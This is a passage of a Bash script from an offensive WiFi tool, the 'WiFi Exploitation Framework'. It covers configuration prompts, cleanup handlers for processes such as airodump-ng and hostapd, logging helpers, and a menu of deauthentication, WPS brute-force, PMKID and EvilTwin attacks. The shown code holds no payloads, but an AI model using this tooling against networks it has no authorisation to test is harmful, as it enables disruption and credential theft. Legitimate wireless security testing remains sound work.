'/frequency_band/ {print $2}' /usr/share/wef/wef.cnf | sed 's/#.*//' | tr -d \" \")\n  auto_enable_monitor=$(awk -F \"=\" '/auto_enable_monitor/ {print $2}' /usr/share/wef/wef.cnf | sed 's/#.*//' | tr -d \" \")\n  create_graph=$(awk -F \"=\" '/create_graph/ {print $2}' /usr/share/wef/wef.cnf | sed 's/#.*//' | tr -d \" \")\n  scan_on_each_attack=$(awk -F \"=\" '/scan_on_each_attack/ {print $2}' /usr/share/wef/wef.cnf | sed 's/#.*//' | tr -d \" \")\n  airmon_check_kill=$(awk -F '=' '/airmon_check_kill/ {print $2}' /usr/share/wef/wef.cnf | sed 's/#.*//' | tr -d \" \")\n  identify_devices=$(awk -F \"=\" '/identify_devices/ {print $2}' /usr/share/wef/wef.cnf | sed 's/#.*//' | tr -d \" \")\n\n  if [ ! \"$verbose\" ] || [ ! \"$frequency_band\" ] || [ ! \"$auto_enable_monitor\" ] || [ ! \"$create_graph\" ] || [ ! \"$scan_on_each_attack\" ] || [ ! \"$airmon_check_kill\" ] | [ ! \"$identify_devices\" ]; then\n\n    if [ \"$lang\" == \"en\" ]; then\n      echo -e \"\\n${grayC}This is the first time you run wef, let's change some configuration parameters. You can make changes later this by editing /usr/share/wef/wef.cnf${endC}\"\n    else\n      echo -e \"\\n${grayC}Esta es la primera vez que usas wef, vamos a cambiar algunos parámetros de la configuración. Puedes hacer cambios más tarde editando /usr/share/wef/wef.cnf${endC}\"\n    fi\n  fi\n\n  # If config has verbose enabled it will be used by default without the --verbose parameter\n  if [ ! \"$verbose\" ]; then\n    while true; do\n      if [ \"$lang\" == \"en\" ]; then\n        color_output_no_line \"*\" \"Do you want to enable verbose by default? (${yC}yes${blueC}/${yC}no${blueC}): \" && read verbose_option\n      else\n        color_output_no_line \"*\" \"¿Quieres activar por defecto el verbose? (${yC}si${blueC}/${yC}no${blueC}): \" && read verbose_option\n      fi\n\n      if [ \"$verbose_option\" == \"y\" ] || [ \"$verbose_option\" == \"yes\" ] || [ \"$verbose_option\" == \"s\" ] || [ \"$verbose_option\" == \"si\" ]; then\n        content=\"$(cat /usr/share/wef/wef.cnf | grep -v \"verbose=\")\"\n        echo -e \"${content}# Enable/disable verbose by default (recommended to be enabled)\\nverbose=true\" > /usr/share/wef/wef.cnf\n        verbose=\"true\"\n        break\n      elif [ \"$verbose_option\" == \"n\" ] || [ \"$verbose_option\" == \"no\" ] ; then\n        content=\"$(cat /usr/share/wef/wef.cnf | grep -v \"verbose=\")\"\n        echo -e \"${content}# Enable/disable verbose by default (recommended to be enabled)\\nverbose=false\" > /usr/share/wef/wef.cnf\n        verbose=\"false\"\n        break\n      fi\n    done\n  fi\n\n  # Config wifi band in which to scan APs\n  if [ ! \"$frequency_band\" ]; then\n    while true; do\n      if [ \"$lang\" == \"en\" ]; then\n        color_output_no_line \"*\" \"Do you want to scan nearby access points on 2.4GHz, 5GHz or autodetect? (${yC}2.4${blueC}/${yC}5${blueC}/${yC}auto${blueC}) (default=auto): \" && read scan_option\n      else\n        color_output_no_line \"*\" \"¿Quieres escanear los puntos de acceso cercano en 2.4GHz, 5GHz o detectar automáticamente? (${yC}2.4${blueC}/${yC}5${blueC}/${yC}auto${blueC}) (por defecto=auto): \" && read scan_option\n      fi\n\n      if [ \"$scan_option\" == \"2\" ] || [ \"$scan_option\" == \"2.4\" ]; then\n        content=\"$(cat /usr/share/wef/wef.cnf | grep -v \"frequency_band=\")\"\n        echo -e \"${content}\\n\n# Wifi band in which to scan access points. Values: 2.4, 5, auto\nfrequency_band=2.4\" > /usr/share/wef/wef.cnf\n        frequency_band=\"2.4\"\n        break\n      elif [ \"$scan_option\" == \"5\" ] ; then\n        content=\"$(cat /usr/share/wef/wef.cnf | grep -v \"frequency_band=\")\"\n        echo -e \"${content}\\n\n# Wifi band in which to scan access points. Values: 2.4, 5, auto\nfrequency_band=5\" > /usr/share/wef/wef.cnf\n        frequency_band=\"5\"\n        break\n      elif [ \"$scan_option\" == \"auto\" ] || [ \"$scan_option\" == \"autodetect\" ] || [ ! \"$scan_option\" ]; then\n        content=\"$(cat /usr/share/wef/wef.cnf | grep -v \"frequency_band=\")\"\n        echo -e \"${content}\\n\n# Wifi band in which to scan access points. Values: 2.4, 5, auto\nfrequency_band=auto\" > /usr/share/wef/wef.cnf\n        frequency_band=\"auto\"\n        break\n      fi\n    done\n  fi\n\n  # enable monitor mode at launch if it is set by default\n  if [ ! \"$auto_enable_monitor\" ]; then\n    while true; do\n      if [ \"$lang\" == \"en\" ]; then\n        color_output_no_line \"*\" \"Do you want to enable monitor mode on each launch by default? (${yC}yes${blueC}/${yC}no${blueC}) (default=yes): \" && read automon_option\n      else\n        color_output_no_line \"*\" \"¿Quieres activar por defecto el modo monitor en cada arranque? (${yC}si${blueC}/${yC}no${blueC}) (por defecto=sí): \" && read automon_option\n      fi\n\n      if [ \"$automon_option\" == \"y\" ] || [ \"$automon_option\" == \"yes\" ] || [ \"$automon_option\" == \"s\" ] || [ \"$automon_option\" == \"si\" ] || [ ! \"$automon_option\" ]; then\n        content=\"$(cat /usr/share/wef/wef.cnf | grep -v \"auto_enable_monitor=\")\"\n        echo -e \"${content}\\n\n# Automatically enable monitor mode during launch\nauto_enable_monitor=true\" > /usr/share/wef/wef.cnf\n        auto_enable_monitor=\"true\"\n        break\n      elif [ \"$automon_option\" == \"n\" ] || [ \"$automon_option\" == \"no\" ] ; then\n        content=\"$(cat /usr/share/wef/wef.cnf | grep -v \"auto_enable_monitor=\")\"\n        echo -e \"${content}\\n\n# Automatically enable monitor mode during launch\nauto_enable_monitor=false\" > /usr/share/wef/wef.cnf\n        auto_enable_monitor=\"false\"\n        break\n      fi\n    done\n  fi\n\n  # Detect auto graph creation\n  if [ ! \"$create_graph\" ]; then\n    while true; do\n      if [ \"$lang\" == \"en\" ]; then\n        color_output_no_line \"*\" \"Do you want to create a graph (using airgraph-ng) on each scan? (${yC}yes${blueC}/${yC}no${blueC}) (default=no): \" && read graph_option\n      else\n        color_output_no_line \"*\" \"¿Quieres crear un gráfico (usando airgraph-ng) en cada escaneo? (${yC}si${blueC}/${yC}no${blueC}) (por defecto=no): \" && read graph_option\n      fi\n\n      if [ \"$graph_option\" == \"y\" ] || [ \"$graph_option\" == \"yes\" ] || [ \"$graph_option\" == \"s\" ] || [ \"$graph_option\" == \"si\" ]; then\n        content=\"$(cat /usr/share/wef/wef.cnf | grep -v \"create_graph=\")\"\n        echo -e \"${content}\\n\n# Create a graph of every single scan you perform using airgraph-ng to see target devices and AP info\ncreate_graph=true\" > /usr/share/wef/wef.cnf\n        create_graph=\"true\"\n        break\n      elif [ \"$graph_option\" == \"n\" ] || [ \"$graph_option\" == \"no\" ] || [ ! \"$graph_option\" ]; then\n        content=\"$(cat /usr/share/wef/wef.cnf | grep -v \"create_graph=\")\"\n        echo -e \"${content}\\n\n# Create a graph of every single scan you perform using airgraph-ng to see target devices and AP info\ncreate_graph=false\" > /usr/share/wef/wef.cnf\n        create_graph=\"false\"\n        break\n      fi\n    done\n  fi\n\n  if [ ! \"$scan_on_each_attack\" ]; then\n    while true; do\n      if [ \"$lang\" == \"en\" ]; then\n        color_output_no_line \"*\" \"Do you want to scan APs on each attack? (${yC}yes${blueC}/${yC}no${blueC}) (default=yes): \" && read scan_aps_option\n      else\n        color_output_no_line \"*\" \"¿Quieres escanear APs en cada ataque? (${yC}si${blueC}/${yC}no${blueC}) (por defecto=sí): \" && read scan_aps_option\n      fi\n\n      if [ \"$scan_aps_option\" == \"y\" ] || [ \"$scan_aps_option\" == \"yes\" ] || [ \"$scan_aps_option\" == \"s\" ] || [ \"$scan_aps_option\" == \"si\" ] || [ ! \"$scan_aps_option\" ]; then\n        content=\"$(cat /usr/share/wef/wef.cnf | grep -v \"scan_on_each_attack=\")\"\n        echo -e \"${content}\\n\n# Scan nearby access points each time you decide to perform an attack\nscan_on_each_attack=true\" > /usr/share/wef/wef.cnf\n        scan_on_each_attack=\"true\"\n        break\n      elif [ \"$scan_aps_option\" == \"n\" ] || [ \"$scan_aps_option\" == \"no\" ]; then\n        content=\"$(cat /usr/share/wef/wef.cnf | grep -v \"scan_on_each_attack=\")\"\n        echo -e \"${content}\\n\n# Scan nearby access points each time you decide to perform an attack\nscan_on_each_attack=false\" > /usr/share/wef/wef.cnf\n        scan_on_each_attack=\"false\"\n        break\n      fi\n    done\n  fi\n\n  # Config 'airmon check kill' which is useful for headless use and other things\n  if [ ! \"$airmon_check_kill\" ]; then\n    while true; do\n      if [ \"$lang\" == \"en\" ]; then\n        color_output_no_line \"*\" \"Do you want to execute \\\"airmon-ng check kill\\\" when enabling monitor mode? This will stop your active network connections so set it to \\\"no\\\" when using on headless setup. (${yC}yes${blueC}/${yC}no${blueC}) (default=yes): \" && read kns_option\n      else\n        color_output_no_line \"*\" \"¿Quieres ejecutar \\\"airmon-ng check kill\\\" al activar el modo monitor? Esto cortará tus conexiones activas asi que elige \\\"no\\\" al usar un setup headless. (${yC}si${blueC}/${yC}no${blueC}) (por defecto=sí): \" && read kns_option\n      fi\n\n      if [ \"$kns_option\" == \"y\" ] || [ \"$kns_option\" == \"yes\" ] || [ \"$kns_option\" == \"s\" ] || [ \"$kns_option\" == \"si\" ] || [ ! \"$kns_option\" ]; then\n        content=\"$(cat /usr/share/wef/wef.cnf | grep -v \"airmon_check_kill=\")\"\n        echo -e \"${content}\\n\n# Execute 'airmon check kill' when you enable monitor mode (disable it on headless device)\nairmon_check_kill=true\" > /usr/share/wef/wef.cnf\n        airmon_check_kill=\"true\"\n        break\n      elif [ \"$kns_option\" == \"n\" ] || [ \"$kns_option\" == \"no\" ] ; then\n        content=\"$(cat /usr/share/wef/wef.cnf | grep -v \"airmon_check_kill=\")\"\n        echo -e \"${content}\\n\n# Execute 'airmon check kill' when you enable monitor mode (disable it on headless device)\nairmon_check_kill=false\" > /usr/share/wef/wef.cnf\n        airmon_check_kill=\"false\"\n        break\n      fi\n    done\n  fi\n\n  if [ ! \"$identify_devices\" ]; then\n    while true; do\n      if [ \"$lang\" == \"en\" ]; then\n        color_output_no_line \"*\" \"Do you want to identify vendor of discovered stations (based on a database)? (${yC}yes${blueC}/${yC}no${blueC}) (default=yes): \" && read identify_option\n      else\n        color_output_no_line \"*\" \"¿Quieres identificar el vendor de las estaciones descubiertas (basado en una base de datos)? (${yC}si${blueC}/${yC}no${blueC}) (por defecto=sí): \" && read identify_option\n      fi\n\n      if [ \"$identify_option\" == \"y\" ] || [ \"$identify_option\" == \"yes\" ] || [ \"$identify_option\" == \"s\" ] || [ \"$identify_option\" == \"si\" ] || [ ! \"$identify_option\" ]; then\n        content=\"$(cat /usr/share/wef/wef.cnf | grep -v \"identify_devices=\")\"\n        echo -e \"${content}\\n\n# Identify vendor of each nearby device found, based on a database (i.e. TP-LINK)\nidentify_devices=true\" > /usr/share/wef/wef.cnf\n        identify_devices=\"true\"\n        break\n      elif [ \"$identify_option\" == \"n\" ] || [ \"$identify_option\" == \"no\" ] ; then\n        content=\"$(cat /usr/share/wef/wef.cnf | grep -v \"identify_devices=\")\"\n        echo -e \"${content}\\n\n# Identify vendor of each nearby device found, based on a database (i.e. TP-LINK)\nidentify_devices=false\" > /usr/share/wef/wef.cnf\n        identify_devices=\"false\"\n        break\n      fi\n    done\n  fi\n  sleep 1\n}\n\n\n#\n# Functions used to catch Ctrl+C sigterm, to remove temporal files and to revert interface changes\n#\n\n# Ctrl+C\nfunction ctrl_c(){\n  if [ \"$(check_interface_mode)\" == \"monitor\" ]; then\n    while true; do\n      if [ \"$lang\" == \"en\" ]; then\n        color_output_no_line \"*\" \"Do you want to disable monitor mode? (${yC}yes${blueC}/${yC}no${blueC}) (default=yes): \" && read disable_opt\n      else\n        color_output_no_line \"*\" \"¿Quieres desactivar el modo monitor? (${yC}si${blueC}/${yC}no${blueC}) (por defecto=sí): \" && read disable_opt\n      fi\n\n      if [ \"$disable_opt\" == \"y\" ] || [ \"$disable_opt\" == \"yes\" ] || [ \"$disable_opt\" == \"s\" ] || [ \"$disable_opt\" == \"si\" ] || [ ! \"$disable_opt\" ]; then\n        disable_mon\n        if [ \"$lang\" == \"en\" ]; then\n          good_output \"+\" \"Monitor mode disabled\"\n        else\n          good_output \"+\" \"Modo monitor desactivado\"\n        fi\n\n        break\n      elif [ \"$disable_opt\" == \"n\" ] || [ \"$disable_opt\" == \"no\" ]; then\n        break\n      elif [ \"$disable_opt\" != \"n\" ] && [ \"$disable_opt\" != \"no\" ]; then\n        color_output \"X\" \"Invalid option\"\n      fi\n    done\n  fi\n\n  kill_processes\n\n  #wpa_process=\"$(ps -faux | grep \"wpa_supplicant\")\"\n  #net_process=\"$(ps -faux | grep \"NetworkManager\")\"\n\n  #if [ ! \"${wpa_process}\" ] || [ ! \"${net_process}\" ]; then\n    #if [ \"$lang\" == \"en\" ]; then\n      #color_output \"*\" \"Restarting connections\"\n    #else\n      #color_output \"*\" \"Restableciendo conexiones\"\n    #fi\n  #fi\n\n  #if [ ! \"${wpa_process}\" ]; then\n  systemctl restart wpa_supplicant 2>/dev/null\n  #fi\n\n  #if [ ! \"${net_process}\" ]; then\n  systemctl restart NetworkManager 2>/dev/null\n  #fi\n\n  if [ \"$lang\" == \"en\" ]; then\n    color_output \"!\" \"Exiting...\"\n  else\n    color_output \"!\" \"Saliendo...\"\n  fi\n\n  # Remove files created during the attacks\n  rm hostapd-wpe.log 2>/dev/null\n  rm /usr/share/wef/cache/eviltwin_attempts.txt 2>/dev/null\n  rm -rf /tmp/www 2>/dev/null\n\n  exit 0\n}\n\n# Ctrl+C for EvilTwin attack\nfunction evil_twin_c(){\n  # Kill created processes\n  if [ \"$lang\" == \"en\" ]; then\n    color_output_ln \"!\" \"Stoping processes...\"\n  else\n    color_output_ln \"!\" \"Parando procesos...\"\n  fi\n\n  killall dhcp &>/dev/null\n  kill_processes\n  systemctl restart systemd-resolved &>/dev/null\n\n  # Reconfigure the network adapter\n  if [ \"$lang\" == \"en\" ]; then\n    color_output \"*\" \"Reconfiguring interface\"\n  else\n    color_output \"*\" \"Reconfigurando la interfaz\"\n  fi\n\n  restore_interface_eviltwin\n}\n\nfunction wash_c(){\n  kill -9 ${wash_PID} 2>/dev/null; wait ${wash_PID} 2>/dev/null\n}\n\n# Ctrl+C for cracking processes\nfunction crack_c(){\n  killall hashcat john aircrack-ng 2>/dev/null\n}\n\n# Ctrl+C for inhibition function\nfunction inhibition_c(){\n  # Kill deauth process\n  killall aireplay-ng 2>/dev/null\n}\n\nfunction keep_exit(){\n  if [ \"$lang\" == \"en\" ]; then\n    echo -ne \"${blueC}[${yC}*${blueC}] Do you want to exit the tool (${yC}yes${blueC}/${yC}no${blueC})? If not, you will return to main menu: ${endC}\" && read exit_status\n  else\n    echo -ne \"${blueC}[${yC}*${blueC}] ¿Quieres salir de la herramienta (${yC}si${blueC}/${yC}no${blueC})? Al elegir \\\"no\\\", volverás al menú principal: ${endC}\" && read exit_status\n  fi\n\n  ctrl_c_pressed=\"true\"\n\n  # If input is y or yes exit the function\n  if [ \"$exit_status\" == \"y\" ] || [ \"$exit_status\" == \"yes\" ] || [ \"$exit_status\" == \"s\" ] || [ \"$exit_status\" == \"si\" ]; then\n    ctrl_c\n  elif [ \"$exit_status\" != \"n\" ] && [ \"$exit_status\" != \"no\" ] || [ ! \"$exit_status\" ]; then\n    keep_exit\n  fi\n}\n\nfunction keep_exit_c(){\n  kill_processes\n\n  if [ \"$lang\" == \"en\" ]; then\n    echo -ne \"\\n${blueC}[${yC}*${blueC}] Ctrl+C detected, do you want to exit the tool? (${yC}yes${blueC}/${yC}no${blueC}) (default=yes): ${endC}\" && read exit_status\n  else\n    echo -ne \"\\n${blueC}[${yC}*${blueC}] Ctrl+C detectado, ¿quieres salir de la herramienta? (${yC}si${blueC}/${yC}no${blueC}) (por defecto=sí): ${endC}\" && read exit_status\n  fi\n\n  if [ \"$exit_status\" == \"y\" ] || [ \"$exit_status\" == \"yes\" ] || [ \"$exit_status\" == \"s\" ] || [ \"$exit_status\" == \"si\" ] || [ ! \"${exit_status}\" ]; then\n    ctrl_c\n  elif [ \"$exit_status\" == \"n\" ] || [ \"$exit_status\" == \"no\" ]; then\n    if [[ $input == 1 ]]; then\n      echo -ne \"${blueC}[${yC}WEF${blueC}] >>${endC} \"\n    fi\n  else\n    keep_exit_c\n  fi\n}\n\nfunction keep_exit_pwnagotchi(){\n  if [ \"$lang\" == \"en\" ]; then\n    echo -ne \"\\n${blueC}[${yC}*${blueC}] Ctrl+C detected, do you want to exit the tool? If not you will return to main menu (${yC}yes${blueC}/${yC}no${blueC}): ${endC}\" && read exit_status\n  else\n    echo -ne \"\\n${blueC}[${yC}*${blueC}] Ctrl+C detectado, ¿quieres salir de la herramienta? Si no volverás al menú principal (${yC}si${blueC}/${yC}no${blueC}): ${endC}\" && read exit_status\n  fi\n\n  sleep 3\n\n  if [ \"$exit_status\" == \"y\" ] || [ \"$exit_status\" == \"yes\" ] || [ \"$exit_status\" == \"s\" ] || [ \"$exit_status\" == \"si\" ]; then\n    exit_from_tool=\"true\"\n  elif [ \"$exit_status\" == \"no\" ] || [ \"$exit_status\" == \"n\" ]; then\n    exit_from_tool=\"false\"\n  else  \n    keep_exit_pwnagotchi\n  fi\n}\n\nfunction keep_exit_eviltwin(){\n  if [ \"$lang\" == \"en\" ]; then\n    echo -ne \"\\n${blueC}[${yC}*${blueC}] Ctrl+C detected, do you want to exit the tool? (${yC}yes${blueC}/${yC}no${blueC}): ${endC}\" && read exit_status\n  else\n    echo -ne \"\\n${blueC}[${yC}*${blueC}] Ctrl+C detectado, ¿quieres salir de la herramienta? (${yC}si${blueC}/${yC}no${blueC}): ${endC}\" && read exit_status\n  fi\n\n  if [ \"$exit_status\" == \"y\" ] || [ \"$exit_status\" == \"yes\" ] || [ \"$exit_status\" == \"s\" ] || [ \"$exit_status\" == \"si\" ]; then\n    evil_twin_c\n    killall hostapd hostapd-wpe dnsmasq lighttpd &>/dev/null\n    exit 0\n  elif [ \"$exit_status\" != \"n\" ] && [ \"$exit_status\" != \"no\" ]; then\n    keep_exit_eviltwin\n  fi\n}\n\nfunction kill_processes(){\n  # Avoid errors by killing possible processes which haven't been killed (shouldn't occur, just to prevent)\n  if [ \"${airodump_PID}\" ]; then\n    kill -9 ${airodump_PID} 2>/dev/null; wait ${airodump_PID} 2>/dev/null\n  fi\n\n  if [ \"${aireplay_PID}\" ]; then\n    kill -9 ${aireplay_PID} 2>/dev/null; wait ${aireplay_PID} 2>/dev/null\n  fi\n\n  if [ \"${mdk4_PID}\" ]; then\n    kill -9 ${mdk4_PID} 2>/dev/null; wait ${mdk4_PID} 2>/dev/null\n  fi\n\n  if [ \"${hcx_PID}\" ]; then\n    kill -9 ${hcx_PID} 2>/dev/null; wait ${hcx_PID} 2>/dev/null\n  fi\n\n  if [ \"${wash_PID}\" ]; then\n    kill -9 ${wash_PID} 2>/dev/null; wait ${wash_PID} 2>/dev/null\n  fi\n\n  if [ \"${reaver_PID}\" ]; then\n    kill -9 ${reaver_PID} 2>/dev/null; wait ${reaver_PID} 2>/dev/null\n  fi\n\n  if [ \"${passive_PID}\" ]; then\n    kill -9 ${passive_PID} 2>/dev/null; wait ${passive_PID} 2>/dev/null\n  fi\n\n  if [ \"${hostapd_PID}\" ]; then\n    kill -9 ${hostapd_PID} 2>/dev/null; wait ${hostapd_PID} 2>/dev/null\n  fi\n\n  if [ \"${dnsmasq_PID}\" ]; then\n    kill -9 ${dnsmasq_PID} 2>/dev/null; wait ${dnsmasq_PID} 2>/dev/null\n  fi\n\n  if [ \"${lighttpd_PID}\" ]; then\n    kill -9 ${lighttpd_PID} 2>/dev/null; wait ${lighttpd_PID} 2>/dev/null\n  fi\n\n  if [ \"${eviltwin_PID}\" ]; then\n    kill -9 ${eviltwin_PID} 2>/dev/null; wait ${eviltwin_PID} 2>/dev/null\n  fi\n\n  if [ \"${eviltwin_deauth_PID}\" ]; then\n    kill -9 ${eviltwin_deauth_PID} 2>/dev/null; wait ${eviltwin_deauth_PID} 2>/dev/null\n  fi\n}\n\n#\n# Logging functions to avoid repeating code\n#\n\nfunction banner(){\n  echo -e \"${yC}\\n██╗    ██╗███████╗███████╗\"\n  echo -e \"██║    ██║██╔════╝██╔════╝               \"\n  echo -e \"██║ █╗ ██║█████╗  █████╗                 \"\n  echo -e \"██║███╗██║██╔══╝  ██╔══╝        ${blueC}WiFi Exploitation Framework ${yC}${program_version}\"\n  echo -e \"╚███╔███╔╝███████╗██║                    \"\n  echo -e \" ╚══╝╚══╝ ╚══════╝╚═╝${endC}\"\n}\n\nfunction color_output_ln(){\n  echo -e \"\\n${blueC}[${yC}${1}${blueC}] ${2}${endC}\"\n}\n\nfunction color_output(){\n  echo -e \"${blueC}[${yC}${1}${blueC}] ${2}${endC}\"\n}\n\nfunction color_output_no_line(){\n  echo -ne \"${blueC}[${yC}${1}${blueC}] ${2}${endC}\"\n}\n\nfunction color_output_tab(){\n  echo -e \"\\t${blueC}[${yC}${1}${blueC}] ${2}${endC}\"\n}\n\nfunction good_output_ln(){\n  echo -e \"\\n${blueC}[${greenC}${1}${blueC}] ${2}${endC}\"\n}\n\nfunction good_output(){\n  echo -e \"${blueC}[${greenC}${1}${blueC}] ${2}${endC}\"\n}\n\nfunction press_enter_attack(){\n  if [ \"$lang\" == \"en\" ]; then\n    echo -ne \"\\n${grayC}Press [Enter] to continue and launch attack${endC} \" && read continue\n  else\n    echo -ne \"\\n${grayC}Presiona [Enter] para continuar y lanzar el ataque${endC} \" && read continue\n  fi\n}\n\nfunction press_enter(){\n  echo -ne \"\\n${grayC}${1}${endC}\" && read continue\n}\n\n# Create a simple progress bar with dots\nfunction progress_bar(){\n  echo -ne \"${blueC}[${yC}${3}${blueC}] ${4}\"\n  for ((i = 0; i <= ${1}; i++)); do\n    echo -ne \".\"\n    sleep ${2}\n  done\n\n  echo -e \"${endC}\"\n}\n\n# This function is used when user selects an attack and monitor mode isn't enabled\nfunction log_monitor_is_disabled(){\n  if [ \"$lang\" == \"en\" ]; then\n    color_output_ln \"*\" \"Your network adapter interface is not in monitor mode.\"\n    echo -e \"${blueC}[${yC}*${blueC}] Please, before doing any operation use the ${yC}enable${blueC} command to enable monitor mode${endC}\"\n  else\n    color_output_ln \"*\" \"La interfaz de la tarjeta de red no está en modo monitor.\"\n    echo -e \"${blueC}[${yC}*${blueC}] Antes de realizar cualquier operación usa el comando ${yC}enable${blueC} para activar el modo monitor${endC}\"\n  fi\n  clear_p=0\n}\n\n# Tell the user that the attack has been completed and a log was stored under logs folder\nfunction log_completed(){\n  if [ \"$lang\" == \"en\" ]; then\n    good_output_ln \"+\" \"Attack completed\"; sleep 0.1\n    color_output \"*\" \"An informative log was created to help you to get track of your attacks in /usr/share/wef/main/logs/${log_name}.log\"\n  else\n    good_output_ln \"+\" \"Ataque completado\"; sleep 0.1\n    color_output \"*\" \"Un log informativo fue creado para ayudar con el seguimiento de tus ataques en /usr/share/wef/main/logs/${log_name}.log\"\n  fi\n}\n\nfunction log_cracking_completed(){\n  if [ \"$lang\" == \"en\" ]; then\n    good_output \"+\" \"Cracking process completed\"\n  else\n    good_output \"+\" \"Proceso de cracking completado\"\n  fi\n}\n\nfunction log_handshakes_not_found(){\n  if [ \"$lang\" == \"en\" ]; then\n    color_output_ln \"X\" \"Handshakes file not found\\n\"\n  else\n    color_output_ln \"X\" \"Archivo de handshakes no encontrado\\n\"\n  fi\n  \n  sleep 1\n}\n\nfunction log_command_not_found(){\n  if [ \"$lang\" == \"en\" ]; then\n    color_output \"*\" \"${1} not installed\" #, ensure to install it before performing this operation\"\n  else\n    color_output \"*\" \"${1} no instalado\" #, asegurate de tenerlo instalado antes de realizar esta operación\"\n  fi\n}\n\n# Tell the user that he/she can type \"back\" and he/she will return to main menu\nfunction log_back_to_menu(){\n  if [ \"$lang\" == \"en\" ]; then\n    color_output_ln \"*\" \"Type ${yC}back${blueC} to return to main menu\"\n  else\n    color_output_ln \"*\" \"Escribe ${yC}back${blueC} para volver al menú principal\"\n  fi\n}\n\nfunction log_capture_files(){\n  if [ \"$lang\" == \"en\" ]; then\n    color_output \"*\" \"Network capture saved as /usr/share/wef/main/captures/${ap_dir}/${cap_name}.cap\"\n  else\n    color_output \"*\" \"Captura de red guardada como /usr/share/wef/main/captures/${ap_dir}/${cap_name}.cap\"\n  fi\n}\n\nfunction log_attack_info(){\n  if [ \"$lang\" == \"en\" ]; then\n    good_output \"+\" \"Attack information\"\n  else\n    good_output \"+\" \"Información del ataque\"\n  fi\n\n  if [ \"$essid\" ]; then\n    echo -e \"${blueC} ESSID:${grayC} ${essid}${endC}\"\n  fi\n\n  if [ \"$ap_bssid\" ]; then\n    echo -e \"${blueC} BSSID:${grayC} ${ap_bssid}${endC}\"\n  fi\n\n  if [ \"$channel\" ]; then\n    if [ \"$lang\" == \"en\" ]; then\n      echo -e \"${blueC} Channel:${grayC} ${channel}${endC}\"\n    else\n      echo -e \"${blueC} Canal:${grayC} ${channel}${endC}\"\n    fi\n  fi\n\n  if [ \"$attack_time\" ]; then\n    if [ \"$lang\" == \"en\" ]; then\n      echo -e \"${blueC} Duration:${grayC} ${attack_time}${endC}\"\n    else\n      echo -e \"${blueC} Duración:${grayC} ${attack_time}${endC}\"\n    fi\n  fi\n\n  if [ \"$frames_to_send\" ]; then\n    if [ \"$lang\" == \"en\" ]; then\n      echo -e \"${blueC} Frames:${grayC} ${frames_to_send}${endC}\"\n    else\n      echo -e \"${blueC} Paquetes:${grayC} ${frames_to_send}${endC}\"\n    fi\n  fi\n\n  if [ \"$c_h\" ]; then\n    if [ \"$lang\" == \"en\" ]; then\n      echo -e \"${blueC} Capture handshakes?:${grayC} ${c_h}${endC}\"\n    else\n      echo -e \"${blueC} Capturar handshakes?:${grayC} ${c_h}${endC}\"\n    fi\n  fi\n\n  if [ \"$c_i\" ]; then\n    if [ \"$lang\" == \"en\" ]; then\n      echo -e \"${blueC} Capture IVs?:${grayC} ${c_i}${endC}\"\n    else\n      echo -e \"${blueC} Capturar IVs?:${grayC} ${c_i}${endC}\"\n    fi\n  fi\n}\n\nfunction log_functions_info(){\n  if [ \"$lang\" == \"en\" ]; then\n    color_output_ln \"*\" \"You can find an explanation of every single attack in the official Wiki: https://github.com/D3Ext/WEF/wiki/Attacks\"\n  else\n    color_output_ln \"*\" \"Puedes encontrar la explicación de cada ataque en la Wiki oficial: https://github.com/D3Ext/WEF/wiki/Attacks\"\n  fi\n}\n\n\n\n\n#\n# Help panels functions\n#\n\nfunction help_panel(){\n  echo -e \"${yC} __      _____ ___ \"\n  echo -e \" \\ \\    / / __| __|\"\n  echo -e \"  \\ \\/\\/ /| _|| _| \"\n  echo -e \"   \\_/\\_/ |___|_|  \"\n  echo -e \"\\n${blueC}[${yC}WEF${blueC}] WiFi Exploitation Framework ${yC}${program_version}${endC}\"\n\n  list_interfaces # Show active interfaces (excluding the ethernet and loopback ones)\n  if [ \"$lang\" == \"en\" ]; then\n    echo -e \"\\n${blueC}Required parameters:\"\n    echo -e \"\\t${yC}-i, --interface)${blueC} \\tThe name of your network adapter interface in managed mode\"\n    echo -e \"\\nOptional parameters:\"\n    echo -e \"\\t${yC}-h, --help)${blueC} \\t\\tShow this help panel\"\n    echo -e \"\\t${yC}--version)${blueC} \\t\\tPrint the version and exit${endC}\"\n  else\n    echo -e \"\\n${blueC}Parámetros requeridos:\"\n    echo -e \"\\t${yC}-i, --interface)${blueC} \\tEl nombre de la interfaz de tu tarjeta de red en modo managed\"\n    echo -e \"\\nParámetros opcionales:\"\n    echo -e \"\\t${yC}-h, --help)${blueC} \\t\\tMuestra este panel de ayuda\"\n    echo -e \"\\t${yC}--version)${blueC} \\t\\tImprime por pantalla la versión actual del programa${endC}\"\n  fi\n  exit 0\n}\n\n# Attacks panel\nfunction attacks_panel(){\n  if [ \"$lang\" == \"en\" ]; then\n    echo -e \"\\n${blueC}--------${yC}DoS attacks${blueC}--------\\t--------${yC}WEP attacks${blueC}---------\\t-----${yC}Rogue AP attacks${blueC}----${endC}\"\n    echo -e \"${blueC}[${yC}1${blueC}] Deauthentication attack\\t[${yC}9${blueC}]  ARP Replay attack\\t\\t[${yC}16${blueC}] EvilTwin attack${endC}\"\n    echo -e \"${blueC}[${yC}2${blueC}] WIDS Confusion attack\\t[${yC}10${blueC}] HIRTE attack${endC}\"\n    echo -e \"${blueC}[${yC}3${blueC}] Authentication attack\\t[${yC}11${blueC}] Caffe Latte attack${endC}\"\n    echo -e \"${blueC}[${yC}4${blueC}] Beacon Flood attack\\t\\t[${yC}12${blueC}] Fake Auth attack${endC}\"\n    echo -e \"${blueC}[${yC}5${blueC}] TKIP attack${endC}\"\n    echo -e \"\\n${blueC}--------${yC}WPS attacks${blueC}--------\\t------${yC}Handshake attacks${blueC}-----${endC}\"\n    echo -e \"${blueC}[${yC}6${blueC}] Pixie Dust attack\\t\\t[${yC}13${blueC}] WPA/WPA2 capture attack (without deauth)${endC}\"\n    echo -e \"${blueC}[${yC}7${blueC}] PIN Bruteforce attack\\t[${yC}14${blueC}] PMKID attack${endC}\"\n    echo -e \"${blueC}[${yC}8${blueC}] Null PIN attack\\t\\t[${yC}15${blueC}] Pwnagotchi mode ${endC}\"\n  else\n    echo -e \"\\n${blueC}---------${yC}Ataques DoS${blueC}---------\\t--------${yC}Ataques WEP${blueC}---------\\t-----${yC}Ataques Rogue AP${blueC}-----${endC}\"\n    echo -e \"${blueC}[${yC}1${blueC}] Ataque de deautenticación\\t[${yC}9${blueC}]  Ataque ARP Replay\\t\\t[${yC}16${blueC}] Ataque EvilTwin${endC}\"\n    echo -e \"${blueC}[${yC}2${blueC}] Ataque de confusión 